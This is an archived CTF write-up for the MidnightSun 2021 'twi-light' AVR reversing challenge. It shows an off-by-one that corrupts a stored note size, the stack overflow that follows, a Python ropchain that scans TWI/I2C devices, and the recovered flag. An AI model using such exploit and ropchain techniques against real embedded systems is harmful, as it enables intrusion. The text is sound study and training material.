# Twi-light

**CTF:** MidnightSun 2021 Quals  
**Category:** rev  
**Original writeup:** <https://ctf.harrisongreen.me/2021/midnightsun/twi-light/> — by **ctf.harrisongreen.me**. All credit goes to the original author; this is an archived copy.

---

twi-light

Description:

Bite my sparkling metal wires, both of them!

Author: larsh

Files:

Overview

We are given challenge.hex and from the challenge tags we know that this is AVR machine code.

This challenge involved a few stages that I have separated into several sections:

Reversing Local environment Bug proof-of-concept Ropchain

1. Reversing

My disassembler-of-choice is Binary Ninja. To disassemble this code, we first need to convert it to a binary format:

$ objcopy -I ihex challenge.hex -O binary challenge.bin

For this challenge I used the binaryninja_avr plugin by Kevin Hamacher which is available directly throught the Binary Ninja plugin manager.

For most reversing tasks, I find it helpful to interact with the program a bit to get a sense of what the program does. This context will give you a good foundation for how to think about the internal components.

In this case, the program just lets you store notes. At the [COMMAND] : prompt, we can type either new , list , del , edit or help :

new : prompts for a NAME and CONTENTS and then saves our note

: prompts for a and and then saves our note list : displays all of the notes in order (and we notice that there are already two notes at the start of execution)

: displays all of the notes in order (and we notice that there are already two notes at the start of execution) del : prompts for an INDEX (notes are 1-indexed) and then deletes a note

: prompts for an (notes are 1-indexed) and then deletes a note edit : prompts for an INDEX and lets us enter a new NAME and CONTENTS

: prompts for an and lets us enter a new and help : prints a list of available instructions

Now that we have a sense of the structure, we can dive into the disassembly…

Side note: strings

Finding string references is really useful when reversing because they act almost like debug symbols. However, with AVR there are some details to be aware of that make this a bit trickier.

AVR chips are a harvard architecture which means the program memory and the data memory are separate (compared to a von Neumann architecture like x86 where the program and data live in the same memory space). This means that address 0x123 can refer to two places: program memory at 0x123 or data memory at 0x123.

When you flash an AVR chip, you are setting ROM . However, during the initialization procedure the program typically copies the data portion of the code into RAM which makes it readable and writeable. Since the compiler knows this, all of the code implicitly references data in RAM instead. Unlike an ELF file where the sections mappings are visible in the header, the mapping here is actually just a loop in the reset procedure and so our disassmebler doesn’t know about it.

So to fix this, we need to identify the src and dst pointers in the copy loop and then we can convert our RAM address (that the code uses) to the original ROM address in order to find the corresponding string.

In this init code, r31:r30 ( Z ) is the src address (0x18fc) in ROM and r27:r26 is the dst address in RAM (0x100). The ending destination address is also specified by r17 and the cpi r26, ... instruction (in this case 0x234).

Now for example in main , we can identify references:

Right before puts (function renamed by me) the address 0x20a is loaded into r25:r24 . We can get the adjusted ROM address via 0x20a - dst + src i.e. 0x20a - 0x100 + 0x18fc == 0x1a06 . This lines up with a string in the original ROM binary:

I wrote a short python snippet that would do this remap and print out the string and used it to annotate the disassembly in a few places.

Reversing Process

I spent about 4 hours going through each function in great detail and annotating things in the disassembly. Binja had a hard time with AVR calling convention so I spent most of my time in the graph view looking at raw disassembly.

During the reversing process I found the following information:

notes are each stored in 64-byte blocks in EEPROM

the structure of a note is: offset 0x0: 1 byte name size offset 0x1: N bytes of name offset 0xC: 1 byte content size offset 0xD: M bytes of content

name sizes are <= 0xC bytes (bug?)

content sizes are <= 0x32 bytes

when you read note data from EEPROM in list , it reads it onto the stack and uses the saved size without validation (!)

, it reads it onto the stack and uses the saved size without validation (!) when functions promt for name and content they will loop 4 times until they get a non-empty string, otherwise they will give up

At this point I spotted that it might be possible to corrupt the content size of a note and cause a stack overflow in list .

I also spent some time reversing the eeprom_read and eeprom_write functions. These functions use the TWI I2C protocol (hence twi-light ). I wasn’t familiar with this protocol before this challenge so I spent some time reading about it. I found this article which gives example code to interface with an EEPROM and it matched the code I found in the binary very closely.

Essentially, TWI lets us communicate to periphal devices on a shared bus. There is some fancy architecture to make sure devices don’t talk at the same time (basically a mutex lock). For the purposes of this challenge, the important part is that once we have control of the data bus, we can send read commands to an EEPROM. First we send a byte to identify the target device and the mode: 0xa0 – bit 0 is off so this is a write, the remaining bits specify the device identifier. Then we send one or two bytes to indicate the address (in EEPROM). Finally, we can either send more bytes to write data or send 0xa1 and start reading bytes.

(Note: the context of bytes is distinguished by setting different values in TWI control registers so for example, we can send 0xa1 as a “command” byte or a “data” byte)

2. Local Environment

For other AVR challenges I’ve used simavr to run AVR binaries locally. In this case I was able to reuse a very similar setup with the addition of the EEPROM device. See the linked writeup for an intro to simavr .

For this challenge, I just patched the board_simduino/simduino.c example:

Include twi/eeprom headers:

#include "avr_twi.h" #include "i2c_eeprom.h" i2c_eeprom_t ee;

Setup an EEPROM buffer and call i2c_eeprom_init and i2c_eeprom_attach once we have our avr object:

char eeprom_mem[ 4096 ]; memset(eeprom_mem, 0 , 4096 ); eeprom_mem[ 0 ] = 4 ; strcpy(eeprom_mem + 1 , "test" ); eeprom_mem[ 0xc ] = 9 ; strcpy(eeprom_mem + 0xd , "aaaabbbb

" ); // Setup eeprom i2c_eeprom_init(avr, & ee, 0xa0 , 0x01 , eeprom_mem, 4096 ); i2c_eeprom_attach(avr, & ee, AVR_IOCTL_TWI_GETIRQ( 0 )); ee.verbose = 1 ;

Simavr also lets us pre-configure the EEPROM memory which I found really useful when testing.

Now we can run the simduino.elf with our challenge.hex and attach avr-gdb and picocom . Unfortunately I found that the serial connection is reaaaaally slow. I could only enter “list” locally by typing list and then spamming enter. I have no idea why it’s so slow. If you have a workaround please let me know!

3. Bug proof-of-concept

With the bugs identified during reversing, I was able to craft a proof-of-concept exploit that causes a buffer overflow with controlled values:

Using the off-by-one bug in the name field, we can corrupt the size of a note’s content. Then when we read from EEPROM, it will read too many bytes on the stack and cause a buffer overflow. The bytes that end up overflowing the saved PC come from the next note’s content. So in this exploit, we can put a ropchain in note 4, then corrupt note 3 and get a controlled overflow.

We can verify that this techique works on remote by putting the address right before a puts call to see if we can get it to print a string it wouldn’t normally print.

In my final exploit, I write the ropchain several times in overlapping segments so I can include null bytes.

Note: the saved PC is always PC/2 in AVR. So if you want to hit address 0x2244, you put “\x11\x22” in your ropchain!

4. Ropchain

The remote EEPROM is pre-programmed with two notes:

TODO : Add address of the other EEPROM to the docs. TODO : Pay fee to NXP for address allocation.

From these hints, it seems pretty clear that there is a second EEPROM device somewhere that probably has the flag.

The first EEPROM has the hardcoded address 0xa0 from the source code but we don’t know the address of the other one. Luckily this is just a 7-bit brute force.

For the ropchain we basically need to do:

send TWI byte target<<1 send address byte 0 send TWI byte target<<1 + 1 (to switch to read mode) read one TWI byte print the byte

We can repurpose some of the existing twi functions to handle these things. Specifically I found the following:

twi_start_byte(v @ r24) : sends a TWI metadata byte (this is used to send 0xa0 and 0xa1)

: sends a TWI metadata byte (this is used to send 0xa0 and 0xa1) twi_data_byte(v @ r24) : sends a TWI data byte

: sends a TWI data byte twi_read_byte() -> r24 : reads one TWI byte into r24

I also found a 6-byte gadget to control r24 and a putchar gadget that sets r25 to 0 and then calls putchar .

Using all of these gadgets, we can build a ropchain like the following:

def set_r24 (r24): return ' \x03\xeb ' + chr(r24) + ' \x03\xeb ' + chr( 0x1 ) twi_start_byte = ' \x04\x21 ' twi_data_byte = ' \x04\x46 ' twi_read_byte = ' \x04\x57 ' f_putchar = ' \x01\x1e ' def make_rop (target, idx): rop = '' rop += set_r24(target << 1 ) # twi write rop += twi_start_byte rop += set_r24(idx) # address rop += twi_data_byte rop += set_r24((target << 1 ) + 1 ) # twi read rop += twi_start_byte rop += twi_read_byte rop += f_putchar

target controls the TWI device and idx controls the byte in EEPROM memory.

During my testing, I found that if we try to read from a device that doesn’t exist, twi_read_byte will not set r24 to any value. So for example, if we try to read from device 0x13 (base 0x26) at index 0 and it’s invalid, we would expect to see 0x27 printed because that is what we previously set it to.

Using this logic, I scanned for all the devices and got output like the following:

... 0x54 b'U' 0x55 0x56 b'W' 0x57 0x58 b'Y' 0x59 0x5a b'[' 0x5b 0x5c b']' 0x5d 0x5e b'_' 0x5f 0x60 b'a' 0x61 0x62 b'c' 0x63 0x64 b'e' 0x65 0x66 b'g' 0x67 0x68 b'i' 0x69 0x6a b'n' 0x6e <<< 0x6c b'm' 0x6d 0x6e b'o' 0x6f 0x70 b'q' 0x71 0x72 b's' 0x73 0x74 b'u' 0x75 0x76 b'w' 0x77 0x78 b'y' 0x79 0x7a b'{' 0x7b 0x7c b'}' 0x7d 0x7e b'\x7f' 0x7f 0x80 b'\x81' 0x81 0x82 b'\x83' 0x83 0x84 b'\x85' 0x85 ...

column 0 is (target « 1), column 1 is the output byte and column 2 is the hex version of the output byte. Apart from the expected byte at 0xa0 (from the known EEPROM) I didn’t see any other data.

After some confusion I realized that there was actually a valid byte at base 0x6a! I changed the program to start reading sequential bytes from that device and found the flag: midnight{two_wires_should_be_enough_for_anyone} .
